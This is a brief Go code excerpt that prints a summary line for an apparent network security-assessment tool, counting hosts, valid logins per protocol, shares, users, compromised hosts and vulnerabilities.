	logx.OK("%s | H:%d IP:%d D:%d | SMB:%d LDAP:%d SSH:%d RDP:%d WinRM:%d MSSQL:%d FTP:%d VNC:%d | Sh:%d U:%d | Pwn:%d V:%d",
		r.Metadata.Duration, r.Summary.TotalHosts, r.Summary.TotalIPs, r.Summary.TotalDomains,
		r.Summary.ValidSMB, r.Summary.ValidLDAP, r.Summary.ValidSSH, r.Summary.ValidRDP,
		r.Summary.ValidWinRM, r.Summary.ValidMSSQL, r.Summary.ValidFTP, r.Summary.ValidVNC,
		r.Summary.TotalShares, r.Summary.TotalUsers, r.Summary.TotalPwn3d, len(gVulns))
	_ = filepath.Base
}